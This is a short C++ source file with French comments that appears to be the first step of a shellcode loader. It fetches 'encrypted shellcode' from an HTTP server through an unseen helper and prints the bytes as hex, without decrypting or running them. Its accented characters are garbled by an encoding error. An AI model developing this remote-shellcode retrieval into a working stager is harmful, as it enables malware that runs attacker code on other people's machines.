#include <iostream> 
#include "HTTPClient.h" 

int main() {
    // R�cup�ration du shellcode chiffr� du serveur HTTP 
    DWORD payloadSize = 0;
    PBYTE payload = getHTTPPayload(payloadSize);

    if (!payload) {
        std::cerr << "�chec de la r�cup�ration du shellcode." << std::endl;
        return 1;
    }

    std::cout << "Shellcode r�cup�r� (chiffr�) :" << std::endl;

    for (DWORD i = 0; i < payloadSize; i++) {
        printf("%02X ", payload[i]);
    }

    std::cout << std::endl;

    LocalFree(payload);

    // Fin de la r�cup�ration du shellcode chiffr� du serveur http 

    return 0;

}